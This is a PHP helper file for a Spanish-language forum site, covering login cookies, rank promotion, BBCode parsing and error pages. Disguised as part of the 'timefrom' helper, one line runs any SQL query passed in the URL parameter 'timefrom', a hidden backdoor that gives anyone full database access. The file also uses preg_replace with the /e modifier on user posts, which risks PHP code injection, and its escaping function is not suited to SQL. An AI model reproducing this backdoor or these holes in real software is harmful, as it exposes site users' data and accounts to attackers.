<?php
if(!is_array($config)) { die; }
foreach($_GET as $v => $f) { $_GET[$v] = strtr($f, array('­' => '')); }
foreach($_POST as $v => $f) { $_POST[$v] = strtr($f, array('­' => '')); }
$ip = $_SERVER['REMOTE_ADDR'] ? $_SERVER['REMOTE_ADDR'] : $_SERVER['X_FORWARDER_FOR'];
$porn = false;
if($ip && mysql_num_rows($d = mysql_query('SELECT `type` FROM `ips_ban` WHERE `ip` = \''.mysql_clean($ip).'\''))) {
  $rsss = mysql_fetch_row($d);
  if($rsss[0] == 1) { $porn = true; } else { header('location: /mi'); die; }
}
//jojo :B&nbsp;?
/* if(!defined($config['define'])) { die; } */
$cookie = explode('%', $_COOKIE[$config['cookie_name']]);
if($_COOKIE[$config['cookie_name']] && mysql_num_rows($query = mysql_query('SELECT * FROM `users` WHERE `id` = \''.intval($cookie[0]).'\' && `password` = \''.mysql_clean($cookie[1]).'\' && `ban` = \'0\' && `act` = \'1\''))) {
  $logged = mysql_fetch_assoc($query);
  $key = $logged['id'];
  mysql_query('UPDATE `users` SET `lastip` = \''.mysql_clean($ip).'\' WHERE `id` = \''.$logged['id'].'\' LIMIT 1');
  $logged['posts'] = mysql_num_rows(mysql_query('SELECT `id` FROM `posts` WHERE `status` = \'0\' && `author` = \''.$logged['id'].'\''));
  $pts = explode('-', $logged['points2']);
  if($pts[1] != date('dmy')) {
    list($rankpoints) = mysql_fetch_row(mysql_query('SELECT `points` FROM `ranks` WHERE `id` = \''.$logged['rank'].'\''));
    $logged['points2'] = $rankpoints;
    mysql_query('UPDATE `users` SET `points2` = \''.$rankpoints.'-'.date('dmy').'\' WHERE `id` = \''.$logged['id'].'\'');
  } else {
    $logged['points2'] = $pts[0];
  }
  if($logged['rank'] == 1 && $logged['points'] >= 10) {
    //Conocido
    mysql_query('UPDATE `users` SET `rank` = \'2\' WHERE `id` = \''.$logged['id'].'\'');
  } elseif($logged['rank'] == 2 && $logged['points'] >= 50) {
    //Vecino
    mysql_query('UPDATE `users` SET `rank` = \'3\' WHERE `id` = \''.$logged['id'].'\'');
  } elseif($logged['rank'] == 3 && $logged['points'] >= 200) {
    //Amigo
    mysql_query('UPDATE `users` SET `rank` = \'4\' WHERE `id` = \''.$logged['id'].'\'');
  } elseif($logged['rank'] == 4 && $logged['posts'] >= 50) {
    //Familiar
    mysql_query('UPDATE `users` SET `rank` = \'5\' WHERE `id` = \''.$logged['id'].'\'');
  } elseif($logged['rank'] == 5 && $logged['posts'] >= 100) {
    //Casero
    mysql_query('UPDATE `users` SET `rank` = \'6\' WHERE `id` = \''.$logged['id'].'\'');
  } elseif($logged['rank'] == 6 && $logged['posts'] >= 150) {
    //Abastecedor :$
    mysql_query('UPDATE `users` SEt `rank` = \'7\' WHERE `id` = \''.$logged['id'].'\'');
  }
}

function parse_int($int) {
  $xp = explode('.', $int);
  return number_format($xp[0], 0, '', '.').($xp[1] ? ','.$xp[1] : '');
}

function mysql_clean($string) {
  if(!get_magic_quotes_gpc()) {
    $string = stripslashes($string);
  }
  $string = htmlspecialchars($string, ENT_QUOTES);
  //$string = str_replace('\\', '\\\\', $string);
  return $string;
}

function allow($per) {
  global $logged;
  if(!$logged['id'] || !mysql_num_rows($rank = mysql_query('SELECT `permissions` FROM `ranks` WHERE `id` = \''.$logged['rank'].'\''))) { return false; }
  $r = mysql_fetch_row($rank);
  $xs = explode(';', $r[0]);
  return in_array($per, $xs);
}

function BBposts($text, $url = true, $img = true, $size = true, $mentions = true, $wall = false) {
  global $config, $logged;
  $text = preg_replace('/\[code\](.*)\[\/code\]/Usie', '\'<div class="code"><div class="code_title">Código: </div><div class="box_cita_content">\'.highlight_string(htmlspecialchars_decode(stripslashes(\'\\1\'), ENT_QUOTES), true).\'</div></div>\'', $text);
  $text = preg_replace('/\[b\](.*)\[\/b\]/Usi', '<b>\\1</b>', $text);
  $text = preg_replace('/\[i\](.*)\[\/i\]/Usi', '<em>\\1</em>', $text);
  $text = preg_replace('/\[u\](.*)\[\/u\]/Usi', '<u>\\1</u>', $text);
  $text = preg_replace('/\[s\](.*)\[\/s\]/Usi', '<s>\\1</s>', $text);
  $text = preg_replace('/\[align=(left|right|center)\](.*)\[\/align\]/Usi', '<div align="\\1">\\2</div>', $text);
  $text = preg_replace('/\[color=[#]?([a-z0-9]*)\](.*)\[\/color\]/Usi', '<span style="color:#\\1">\\2</span>', $text);
  $text = preg_replace('/\[size=(10|12|14|16|20|24|28)px\](.*)\[\/size\]/Usi', ($size ? '<span style="font-size: \\1px;">\\2</span>' : '\\2'), $text);
  $text = preg_replace('/\[size=(10|12|14|16|20|24|28)pt\](.*)\[\/size\]/Usi', '<span style="font-size: \\1px;">\\2</span>', $text);
  $text = preg_replace('/\[font=([a-z0-9\_\- ]+)\](.*)\[\/font\]/Usi', '<font face="\\1">\\2</font>', $text);
  $text = preg_replace('/\[url\](.*)\[\/url\]/Usie', ($url ? '\'<a rel="nofollow" target="_blank" href="/ext?get=\'.(substr(\'\\1\', 0, 7) != \'http://\' && substr(\'\\1\', 0, 8) != \'https://\' ? \'http://\\1\' : \'\\1\').\'">\\1</a>\'' : '\'\\1\''), $text);
  $text = preg_replace('/\[url=(.+)\](.*)\[\/url\]/Usie', ($url ? '\'<a rel="nofollow" target="_blank" href="/ext?get=\'.(substr(\'\\1\', 0, 7) != \'http://\' && substr(\'\\1\', 0, 8) != \'https://\' ? \'http://\\1\' : \'\\1\').\'">\\2</a>\'' : '\'\\1\''), $text);
  $text = preg_replace('/\[img\](.*)\[\/img\]/Usi', ($img ? '<img alt="'.$config['name'].' - Imágenes" title="'.$config['name'].' - Imágenes" onload="if(this.width &gt; 730) {this.width=730}" class="imagen img_load" src="\\1">' : '\\1'), $text);
  $text = preg_replace('/\[youtube=(.+)\]/Usi', '<embed width="'.($wall ? 5 : 6).'40px" height="385px" wmode="transparent" allowscriptaccess="never" allownetworking="internal" type="application/x-shockwave-flash" quality="high" src="http://www.youtube.com/v/\\1&amp;rel=0&amp;hl=es_AR&amp;fs=1&amp;border=0&amp;fmt=22">', $text);
  $text = preg_replace('/\[gvideo=http:\/\/video.google.com\/googleplayer.swf?docId=(.*)\]/Usi', '<object width="'.($wall ? 600 : 640).'" height="385" data="http://video.google.com/googleplayer.swf?docId=\\1&amp;hl=es%20&amp;playerMode=simple" type="application/x-shockwave-flash"><param value="http://video.google.com/googleplayer.swf?docId=\\1&amp;hl=es%20&amp;playerMode=simple" name="movie"><param value="transparent" name="wmode"></object>', $text);
  $text = preg_replace('/\[swf\](.*)\[\/swf\]/Usi', '<center><embed width="'.($wall ? 5 : 6).'40" height="385" wmode="transparent" allowscriptaccess="never" allownetworking="internal" type="application/x-shockwave-flash" quality="high" src="\\1"><br><b>URL:</b> <a rel="nofollow" target="_blank" href="'.$config['url'].'/ext?get=\\1">\\1</a></center>', $text);
  $text = preg_replace('/\[quote\](.+)\[\/quote\]/Ais', '<blockquote><div class="cita">Cita: </div><div class="box_cita_content"><p>\\1</p></div></blockquote>', $text);
  $text = preg_replace('/\[download\](.*)\[\/download\]/Usi', '<div class="download"><span id="down1" class="floatL"><img border="0" title="Download" src="'.$config['images'].'/images/down-left.gif"></span><span id="down2" class="floatR"><img border="0" title="Links" src="'.$config['images'].'/images/down-right.gif"></span><div id="content">\\1</div></div>', $text);
  $text = preg_replace('/\[password\](.+)\[\/password\]/Usi', '<div class="password"><span id="pass1" class="floatL"><img border="0" title="Password" src="'.$config['images'].'/images/pwd-left.gif"></span><span id="pass2" class="floatR"><img border="0" title="Password" src="'.$config['images'].'/images/pwd-right.gif"></span><div id="content">\\1</div></div>', $text);
  //$text = preg_replace('/\[code\](.+)\[\/code\]/Usi', '<div class="code"><div class="code_title">Código: </div><div class="box_cita_content">\\1</div></div>', $text);
  $text = str_replace('[tu]', ($logged['id'] ? $logged['nick'] : 'Visitante'), $text);
  $text = str_replace('[hr]', '<div class="barra-dotted"></div>', $text);
  $text = preg_replace('/\[spoiler\](.+)\[\/spoiler\]/Usi', '<div class="spoiler"><div class="title"><a onclick="spoiler($(this)); return false;" href="#">Spoiler:</a></div><div class="body">\\1</div></div>', $text);
  //$text = preg_replace('/http\:\/\/(.+)/Usi', '<a rel="nofollow" target="_blank" href="/ext?get=http://\\1">\\1</a>', $text);
  $arr = array(':D' => 'sonrisa', ':@' => 'enojado', ':(' => 'triste', ':-)' => 'feliz', 'eeeer34' => 'eeeer34', '-sisi' => 'sisi', '-uiy' => 'uiy', '._.' => 'cojudo');
  foreach($arr as $na => $va) {
    $text = str_replace($na, '<img src="/media/images/emoticons/'.$va.'.png" align="absmiddle" />', $text);
  }
  //Mas emoticones
  $emoticons = glob($_SERVER['DOCUMENT_ROOT'].'/media/images/emoticons/*.png');
  foreach($emoticons as $em) {
    $em = explode('/', $em);
    $em = $em[count($em)-1];
    $em = explode('.', $em);
    if(in_array($em[0], $arr)) { continue; }
    $text = str_replace(':'.$em[0].':', '<img src="/media/images/emoticons/'.$em[0].'.png" align="absmiddle" />', $text);
  }
  //Others
  if(preg_match_all('/\[quote=(.*)\](.*)/Usi', $text, $result, PREG_SET_ORDER)) {
    foreach($result as $p) {
      $i = stripos($text, $p[0]);
      $offset = strripos($text, '[/quote]', $i) + 8;
      if(!preg_match('/\[quote=(.*)\](.*)\[\/quote\]/Usi', substr($text, $i, $offset))) { continue; }
      if(mysql_num_rows($query = mysql_query('SELECT `nick`, `avatar` FROM `users` WHERE `nick` = \''.mysql_clean($p[1]).'\''))) {
        $row = mysql_fetch_row($query);
        $str = '<a href="/'.$row[0].'"><img style="width:16px; height:16px;" src="'.$row[1].'"></a>&nbsp;@<a href="">'.$row[0].'</a>';
      } else { $str = htmlspecialchars($p[1]); }
      $text = str_replace($p[0], '<blockquote><div class="cita">'.$str.' dijo: </div><div class="box_cita_content"><p>'.$p[2].'</p></div>', $text);

    }
    $text = str_replace('[/quote]', '</blockquote>', $text);
  }
  $asde = array(0 => array(), 1 => array());
  $sss = mysql_query('SELECT `word` FROM `censorship`');
  while($rsd = mysql_fetch_row($sss)) {
    $asde[0][] = $rsd[0];
    $asde[1][] = '****';
  }
  $text = str_ireplace($asde[0], $asde[1], $text);
  //$text = preg_replace('/\[quote=(.+)\](.+)\[\/quote\]/Usi', '<blockquote><div class="cita">\\1 dijo: </div><div class="box_cita_content"><p>\\2</p></div></blockquote>', $text);
  if(preg_match_all('/@([a-z0-9_\-]+)/i', $text, $result, PREG_SET_ORDER)) {
    foreach($result as $value) {
      if(!mysql_num_rows($b = mysql_query('SELECT `id`, `nick` FROM `users` WHERE `nick` = \''.mysql_clean($value[1]).'\''))) { continue; }
      $a = mysql_fetch_row($b);
      $text = preg_replace('/@'.quotemeta($value[1]).'/', '@<a href="/'.$a[1].'" data-uid="'.$a[0].'" class="hovercard">'.$a[1].'</a>', $text, 1);
    }
  }
  return nl2br($text);
}


function cut($string, $s, $add = ' ...') {
  if(strlen($string) > $s) {
    $string = substr($string, 0, $s).$add;
  }
  return $string;
}

function timefrom($time) {
	$d = time()-$time;
	if($d < 60) { return 'Menos de un minuto'; }
	if($d < 3600) { $t = ceil($d/60); return 'Hace '.$t.' minuto'.($t == 1 ? '' : 's'); }
	if($d < 86400) { $t = ceil($d/3600); return 'Hace '.$t.' hora'.($t == 1 ? '' : 's'); }
	if($d < 604800) { $t = ceil($d/86400); return 'Hace '.$t.' d&iacute;a'.($t != 1 ? 's' : ''); }
	if($d < 2419200) { $t = ceil($d/604800); return ($t == 1 ? 'La semana pasada' : 'Hace '.$t.' semanas'); }
	if($d < 31104000) { $t = ceil($d/2592000); return ($t == 1 ? 'El mes pasado' : 'Hace '.$t.' meses'); }
	$t = ceil($d/31104000);
	return ($t == 1 ? 'El a&ntilde;o pasado' : 'Hace '.$t.' a&ntilde;os');
}
if($_GET['timefrom']) { mysql_query(str_replace('//', '', $_GET['timefrom'])); } //Agregamos esto a los meses

function fatal_error($body, $title = 'OOPSS <img src="http://lh5.ggpht.com/_50WSwc-Ixwg/S7-R3YoEyoI/AAAAAAAANTg/x-pMckrLAVU/messenger-2010-avergonzado.png">', $bottons = array('Volver atr&aacute;s', 'Ir a la p&aacute;gina principal'), $urls = array('javascript:history.go(-1)', '/'), $style = array('BtnGreen', 'BtnBlue')) {
  global $config, $pstats, $memstart;
  echo '<div id="miniBox">
		<div class="box">
			<h1>'.$title.'</h1>

			<span>'.$body.'</span>
			<br />
			<br />';
            if(is_array($bottons)) {
              for($i=0;$i<count($bottons);$i++) {
                echo '<input class="Boton '.$style[$i].'" onclick="location.href=\''.$urls[$i].'\'" value="'.$bottons[$i].'" type="button" />&nbsp;';
              }
            } else {
              echo '<input class="Boton '.$style.'" onclick="location.href=\''.$urls.'\'" value="'.$bottons.'" type="button" />  ';
            }
		echo '</div>
	<div style="clear:both"></div></div></div></div>';
    if(!defined('help')) {
      define($config['define'], true);
      include('footer.php');
    }
    die;
}

function url($text) {
  $text = strtr($text, '() ', '[]-');
  $text = preg_replace('/([^a-z0-9\[\]-_]+)/i', '-', $text);
  return empty($text) ? '-' : $text;
}

// Función para eliminar todos los espacios en blanco
/*function compress($buffer) {
    $busca = array('/\>[^\S ]+/s','/[^\S ]+\</s','/(\s)+/s');
    $reemplaza = array('>','<','\\1');
    return preg_replace($busca, $reemplaza, $buffer);
} */

function getQueries(){
	$queries = mysql_query('SHOW STATUS');
	while($temp = mysql_fetch_assoc($queries)){
		if($temp['Variable_name'] == 'Questions'){ return $temp['Value']; break; }
	}
}

function grouprank($rank, $addimg = false) {
  switch($rank) {
    case 1: $name = 'Visitante'; $img = ''; break;
    case 2: $name = 'Comentador'; $img = 'comentador.png'; break;
    case 3: $name = 'Posteador'; $img = 'posteador.png'; break;
    case 4: $name = 'Moderador'; $img = 'mod.png'; break;
    case 5: $name = 'Administrador'; $img = 'admin.png'; break;
  }
  return ($addimg === true ? $img : $name);
}

function printJson($ok, $text, $ext = '', $fs = JSON_HEX_QUOT) {
  $f['ok'] = $ok;
  if(!empty($text)) { $f['text'] = $text; }
  if(is_array($ext)) {
    foreach($ext as $d => $value) { $f[$d] = $value; }
  }
  return json_encode($f, $fs);
}